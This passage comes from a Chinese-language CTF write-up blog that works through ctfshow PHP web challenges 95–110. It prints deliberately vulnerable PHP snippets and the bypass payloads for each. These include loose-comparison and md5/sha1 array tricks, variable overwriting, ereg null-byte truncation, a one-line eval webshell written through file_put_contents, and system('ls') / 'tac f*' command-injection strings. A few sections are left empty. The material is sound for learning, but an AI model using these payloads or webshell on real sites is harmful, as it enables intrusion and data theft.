class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0a010574?num=%20010574?num=+010574</span><br></pre></td></tr></table></figure><h2 id="1-8-Web-96-—-路径书写"><a href="#1-8-Web-96-—-路径书写" class="headerlink" title="1.8 Web 96 — 路径书写"></a>1.8 Web 96 — 路径书写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);    &#125;&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php<span class="comment">#路径?u=/var/www/html/flag.php?u=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39"><a href="#1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39" class="headerlink" title="1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))"></a>1.9 Web 97 — md5 数组 [ ] 绕过 — <code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))<span class="keyword">echo</span> <span class="variable">$flag</span>;elseprint <span class="string">&#x27;Wrong.&#x27;</span>;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h2 id="1-10-Web-98-—-三目运算符、变量覆盖"><a href="#1-10-Web-98-—-三目运算符、变量覆盖" class="headerlink" title="1.10 Web 98 — 三目运算符、变量覆盖"></a>1.10 Web 98 — 三目运算符、变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三目运算符以及变量覆盖若GET传参，POST值将覆盖GET值</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get传参：?flag=1post传参：?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h2 id="1-11-Web-99-—-file-put-contents"><a href="#1-11-Web-99-—-file-put-contents" class="headerlink" title="1.11 Web 99 — file_put_contents"></a>1.11 Web 99 — file_put_contents</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;     array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/17/fi76py2toXNEksO.png" alt="image-20210717144542465"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当没有第三个参数时，in_array之中的比较与 == 一致当第三个参数为 <span class="literal">true</span> 时，in_array之中的比较与 === 一致<span class="variable">$allow</span> = array(1,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);var_dump(in_array(<span class="string">&#x27;1.php&#x27;</span>,<span class="variable">$allow</span>));<span class="comment">#类型不同，首先转换，返回 true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型一致，直接比较，返回false</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 /1.php</p><p><img src="https://i.loli.net/2021/08/05/M8ypxAwW7jNsoP6.png" alt="image-20210805214445932"></p><h2 id="1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”"><a href="#1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”" class="headerlink" title="1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);"></a>1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);<span class="comment">//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;   &#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>var_dump(<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>);<span class="comment">// falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false &amp;&amp; false);// false$a=true and false and false;var_dump($a);  // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>;var_dump(<span class="variable">$a</span>);  // trueif(<span class="variable">$a</span> === <span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;//不输出&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>;var_dump(<span class="variable">$a</span>); <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>)&#123;<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;&#125;//bool(<span class="literal">false</span>) 111</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">if</span>(<span class="variable">$v0</span>)绕过：v1 是数字2. v2 不能有分号，那么无法使用 命令执行函数，那么使用 ``3. 使用注释将 v3 注释掉，相当于把 (<span class="string">&#x27;ctfshow&#x27;</span>) 注释掉4. 注意，v3 一定要写上 ;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>构造成下面的感觉</p><p><img src="https://i.loli.net/2021/08/05/GTRs27cIVn3MmHB.png" alt="image-20210805221256350"></p><p>查 ctfshow.php 试试</p><p><img src="https://i.loli.net/2021/08/05/xAJrKWGiBOjhmTu.png" alt="image-20210805221505214"></p><p>其中，<code>0x2d  </code> 是 <code>-</code></p><h2 id="1-13-Web-101-—-ReflectionClass-关于一个类的反射"><a href="#1-13-Web-101-—-ReflectionClass-关于一个类的反射" class="headerlink" title="1.13 Web 101 — ReflectionClass 关于一个类的反射"></a>1.13 Web 101 — ReflectionClass 关于一个类的反射</h2><p><a href="http://www.thinkphp.cn/code/4863.html">http://www.thinkphp.cn/code/4863.html</a></p><p><img src="https://i.loli.net/2021/08/05/WCA6wXcS4Bxt89l.png" alt="image-20210805224208153"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修补100题非预期,替换0x2d</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);include(<span class="string">&quot;ctfshow.php&quot;</span>);//flag <span class="keyword">in</span> class ctfshow;<span class="variable">$ctfshow</span> = new ctfshow();<span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) and is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;            <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="variable">$v3</span>&quot;</span>);        &#125;    &#125;  &#125;?&gt;</span><br></pre></td></tr></table></figure><p>上面的 v2 构造的符号 被过滤</p><p><strong>构造 eval(echo new ReflectionClass(‘ctfshow’));</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h2 id="1-14-Web-102"><a href="#1-14-Web-102" class="headerlink" title="1.14 Web 102"></a>1.14 Web 102</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,2);    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);    <span class="built_in">echo</span> <span class="variable">$str</span>;    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);&#125;<span class="keyword">else</span>&#123;    die(<span class="string">&#x27;hacker&#x27;</span>);&#125;?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-15-Web-103"><a href="#1-15-Web-103" class="headerlink" title="1.15 Web 103"></a>1.15 Web 103</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-16-Web-104-—-shal-数组-绕过"><a href="#1-16-Web-104-—-shal-数组-绕过" class="headerlink" title="1.16 Web 104 — shal() 数组 [ ] 绕过"></a>1.16 Web 104 — shal() 数组 [ ] 绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换个姿势</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1?v2=1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1[]=1?v2[]=2</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m</span><br></pre></td></tr></table></figure><h2 id="1-17-Web-105-—-变量覆盖"><a href="#1-17-Web-105-—-变量覆盖" class="headerlink" title="1.17 Web 105 — 变量覆盖"></a>1.17 Web 105 — 变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);error_reporting(<span class="number">0</span>);<span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;<span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;<span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;    &#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;&#125;<span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;    <span class="keyword">die</span>(<span class="variable">$error</span>);&#125;<span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;<span class="keyword">die</span>(<span class="variable">$suces</span>);<span class="meta">?&gt;</span>你还想要flag嘛？</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="variable">$key</span>=$<span class="variable">$value</span>;<span class="comment">#变量覆盖，将值作为变量赋给键作为变量，如果传入，?suces=flag，即相当于 $suces=$flag，即将$flag的值赋给$suces，所以我只需要想办法 输出 $suces 即可</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/V4pOyTZECmWY2B7.png" alt="image-20210718203822905"></p><p>可以看到，仅仅传入以上内容，会显示 $error 报错，我们可以通过 POST传参，将 $flag 的值赋给 $error 即可</p><p><img src="https://i.loli.net/2021/07/18/YGmoRLev1xTq5Wz.png" alt="image-20210718203954650"></p><p>思考</p><ul><li><p>通过 <code>die(suces)</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: suces=flagpost: flag=</span><br></pre></td></tr></table></figure></li><li><p>通过 <code>die(error)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: suces=flagpost: error=suces</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-15-Web-106-—-shal-数组-绕过"><a href="#1-15-Web-106-—-shal-数组-绕过" class="headerlink" title="1.15 Web 106 — shal() 数组 [ ] 绕过"></a>1.15 Web 106 — shal() 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1[]=1v2[]=2</span><br></pre></td></tr></table></figure><h2 id="1-16-Web-107-—-parse-str"><a href="#1-16-Web-107-—-parse-str" class="headerlink" title="1.16 Web 107 — parse_str()"></a>1.16 Web 107 — parse_str()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;           <span class="keyword">echo</span> <span class="variable">$flag</span>;       &#125;&#125;<span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#parse_str($v1,$v2);把$1字符串解析到变量 $2当中，以数组形式get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/54Y8EOvFWDByebl.png" alt="image-20210718205544680"></p><h2 id="1-17-Web-108-—-ereg-截断漏洞"><a href="#1-17-Web-108-—-ereg-截断漏洞" class="headerlink" title="1.17 Web 108 — ereg() 截断漏洞"></a>1.17 Web 108 — ereg() 截断漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);&#125;<span class="comment">//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;<span class="meta">?&gt;</span>error</span></span><br></pre></td></tr></table></figure> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#strrev()反转字符串#intval()获取变量整数值#0x36d 的十进制是 877</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg() 存在00截断漏洞，即%00之后的内容不会进行匹配函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回<span class="literal">true</span>,否则,则返回<span class="literal">false</span>。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=sds%00778</span><br></pre></td></tr></table></figure><h2 id="1-18-Web-109-—-v1-v2-内置类"><a href="#1-18-Web-109-—-v1-v2-内置类" class="headerlink" title="1.18 Web 109 — $v1($v2()) 内置类"></a>1.18 Web 109 — $v1($v2()) 内置类</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随便找个php中的内置类并且可以直接echo输出的就可以ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="1-19-Web-110-—-new-v1-v2"><a href="#1-19-Web-110-—-new-v1-v2" class="headerlink" title="1.19 Web 110 — new $v1($v2())"></a>1.19 Web 110 — new $v1($v2())</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span 